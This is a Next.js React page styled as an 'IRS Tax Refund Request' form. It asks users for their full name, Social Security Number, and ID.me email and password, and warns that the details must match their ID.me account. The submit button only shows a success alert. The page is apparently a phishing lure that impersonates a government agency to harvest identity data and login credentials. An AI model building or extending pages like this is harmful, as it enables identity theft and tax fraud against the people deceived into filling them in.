'use client';

import { useState } from 'react';
import Link from 'next/link';

export default function TaxRefundPage() {
  const [formData, setFormData] = useState({
    fullName: '',
    ssn: '',
    idmeEmail: '',
    idmePassword: '',
    country: 'Afghanistan',
  });

  const countries = [
    'Afghanistan', 'Albania', 'Algeria', 'Andorra', 'Angola', 'Argentina', 'Armenia', 'Australia',
    'Austria', 'Azerbaijan', 'Bahamas', 'Bahrain', 'Bangladesh', 'Barbados', 'Belarus', 'Belgium',
    'Belize', 'Benin', 'Bhutan', 'Bolivia', 'Bosnia and Herzegovina', 'Botswana', 'Brazil', 'Brunei',
    'Bulgaria', 'Burkina Faso', 'Burundi', 'Cambodia', 'Cameroon', 'Canada', 'Cape Verde', 'Central African Republic',
    'Chad', 'Chile', 'China', 'Colombia', 'Comoros', 'Congo', 'Costa Rica', 'Croatia', 'Cuba', 'Cyprus',
    'Czech Republic', 'Denmark', 'Djibouti', 'Dominica', 'Dominican Republic', 'Ecuador', 'Egypt', 'El Salvador',
    'Equatorial Guinea', 'Eritrea', 'Estonia', 'Ethiopia', 'Fiji', 'Finland', 'France', 'Gabon', 'Gambia',
    'Georgia', 'Germany', 'Ghana', 'Greece', 'Grenada', 'Guatemala', 'Guinea', 'Guinea-Bissau', 'Guyana',
    'Haiti', 'Honduras', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland', 'Israel',
    'Italy', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kiribati', 'Kuwait', 'Kyrgyzstan', 'Laos',
    'Latvia', 'Lebanon', 'Lesotho', 'Liberia', 'Libya', 'Liechtenstein', 'Lithuania', 'Luxembourg', 'Madagascar',
    'Malawi', 'Malaysia', 'Maldives', 'Mali', 'Malta', 'Marshall Islands', 'Mauritania', 'Mauritius', 'Mexico',
    'Micronesia', 'Moldova', 'Monaco', 'Mongolia', 'Montenegro', 'Morocco', 'Mozambique', 'Myanmar', 'Namibia',
    'Nauru', 'Nepal', 'Netherlands', 'New Zealand', 'Nicaragua', 'Niger', 'Nigeria', 'North Korea', 'North Macedonia',
    'Norway', 'Oman', 'Pakistan', 'Palau', 'Palestine', 'Panama', 'Papua New Guinea', 'Paraguay', 'Peru',
    'Philippines', 'Poland', 'Portugal', 'Qatar', 'Romania', 'Russia', 'Rwanda', 'Saint Kitts and Nevis',
    'Saint Lucia', 'Saint Vincent and the Grenadines', 'Samoa', 'San Marino', 'Sao Tome and Principe',
    'Saudi Arabia', 'Senegal', 'Serbia', 'Seychelles', 'Sierra Leone', 'Singapore', 'Slovakia', 'Slovenia',
    'Solomon Islands', 'Somalia', 'South Africa', 'South Korea', 'South Sudan', 'Spain', 'Sri Lanka', 'Sudan',
    'Suriname', 'Sweden', 'Switzerland', 'Syria', 'Taiwan', 'Tajikistan', 'Tanzania', 'Thailand', 'Timor-Leste',
    'Togo', 'Tonga', 'Trinidad and Tobago', 'Tunisia', 'Turkey', 'Turkmenistan', 'Tuvalu', 'Uganda', 'Ukraine',
    'United Arab Emirates', 'United Kingdom', 'United States', 'Uruguay', 'Uzbekistan', 'Vanuatu', 'Vatican City',
    'Venezuela', 'Vietnam', 'Yemen', 'Zambia', 'Zimbabwe'
  ];

  const handleSubmit = () => {
    alert('Request submitted successfully!');
  };

  return (
    <div className="p-4 lg:p-6">
      {/* Page Header */}
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center space-x-3">
          <Link href="/dashboard" className="w-10 h-10 rounded-full bg-[#1e293b] flex items-center justify-center hover:bg-[#334155] transition-colors">
            <i className="fa-solid fa-arrow-left text-gray-400"></i>
          </Link>
          <h1 className="text-2xl font-bold text-white">IRS Tax Refund</h1>
        </div>
        <button className="px-4 py-2 bg-[#1e293b] text-white rounded-lg font-medium hover:bg-[#334155] transition-colors flex items-center space-x-2">
          <i className="fa-solid fa-list-check"></i>
          <span>Track Status</span>
        </button>
      </div>

      {/* Form Container */}
      <div className="bg-[#1e293b] rounded-xl overflow-hidden">
        {/* Header Section */}
        <div className="p-8 text-center border-b border-gray-700">
          <div className="w-16 h-16 bg-[#0ea5e9] rounded-2xl flex items-center justify-center mx-auto mb-4">
            <i className="fa-solid fa-file-lines text-white text-2xl"></i>
          </div>
          <h2 className="text-xl font-bold text-white mb-2">IRS Tax Refund Request</h2>
          <p className="text-gray-400">Please fill out the form below to submit your IRS tax refund request</p>
        </div>

        {/* Form */}
        <div className="p-6 space-y-6">
          {/* Personal Information */}
          <div>
            <div className="flex items-center space-x-2 mb-4">
              <i className="fa-solid fa-user text-[#0ea5e9]"></i>
              <h3 className="text-white font-semibold">Personal Information</h3>
            </div>
            
            <div className="space-y-4">
              <div>
                <label className="block text-gray-400 text-sm mb-2">Full Name</label>
                <div className="relative">
                  <i className="fa-solid fa-user absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                  <input
                    type="text"
                    placeholder="Enter your full name"
                    value={formData.fullName}
                    onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                    className="w-full pl-12 pr-4 py-3 bg-[#0f172a] border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-[#0ea5e9]"
                  />
                </div>
              </div>
              
              <div>
                <label className="block text-gray-400 text-sm mb-2">Social Security Number (SSN)</label>
                <div className="relative">
                  <i className="fa-solid fa-shield-halved absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                  <input
                    type="text"
                    placeholder="XXX-XX-XXXX"
                    value={formData.ssn}
                    onChange={(e) => setFormData({...formData, ssn: e.target.value})}
                    className="w-full pl-12 pr-4 py-3 bg-[#0f172a] border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-[#0ea5e9]"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* ID.me Credentials */}
          <div>
            <div className="flex items-center space-x-2 mb-4">
              <i className="fa-solid fa-lock text-amber-500"></i>
              <h3 className="text-white font-semibold">ID.me Credentials</h3>
            </div>
            
            <div className="space-y-4">
              <div>
                <label className="block text-gray-400 text-sm mb-2">ID.me Email</label>
                <div className="relative">
                  <i className="fa-solid fa-envelope absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                  <input
                    type="email"
                    placeholder="Enter your ID.me email"
                    value={formData.idmeEmail}
                    onChange={(e) => setFormData({...formData, idmeEmail: e.target.value})}
                    className="w-full pl-12 pr-4 py-3 bg-[#0f172a] border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-[#0ea5e9]"
                  />
                </div>
              </div>
              
              <div>
                <label className="block text-gray-400 text-sm mb-2">ID.me Password</label>
                <div className="relative">
                  <i className="fa-solid fa-key absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                  <input
                    type="password"
                    placeholder="Enter your ID.me password"
                    value={formData.idmePassword}
                    onChange={(e) => setFormData({...formData, idmePassword: e.target.value})}
                    className="w-full pl-12 pr-4 py-3 bg-[#0f172a] border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-[#0ea5e9]"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Location Information */}
          <div>
            <div className="flex items-center space-x-2 mb-4">
              <i className="fa-solid fa-location-dot text-[#0ea5e9]"></i>
              <h3 className="text-white font-semibold">Location Information</h3>
            </div>
            
            <div>
              <label className="block text-gray-400 text-sm mb-2">Country</label>
              <div className="relative">
                <select
                  value={formData.country}
                  onChange={(e) => setFormData({...formData, country: e.target.value})}
                  className="w-full px-4 py-3 bg-[#0f172a] border border-gray-700 rounded-xl text-white focus:outline-none focus:border-[#0ea5e9] appearance-none cursor-pointer"
                >
                  {countries.map((country) => (
                    <option key={country} value={country}>{country}</option>
                  ))}
                </select>
                <i className="fa-solid fa-chevron-down absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none"></i>
              </div>
            </div>
          </div>

          {/* Important Notice */}
          <div className="bg-[#0f172a] rounded-xl p-4">
            <div className="flex items-start space-x-3">
              <i className="fa-solid fa-circle-info text-[#0ea5e9] mt-0.5"></i>
              <div>
                <h4 className="text-white font-semibold mb-1">Important Notice</h4>
                <p className="text-gray-400 text-sm">
                  Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.
                </p>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <div className="flex justify-end">
            <button 
              onClick={handleSubmit}
              className="px-6 py-3 bg-[#0ea5e9] text-white rounded-xl font-semibold hover:bg-[#0284c7] transition-colors flex items-center space-x-2"
            >
              <i className="fa-solid fa-paper-plane"></i>
              <span>Submit Request</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
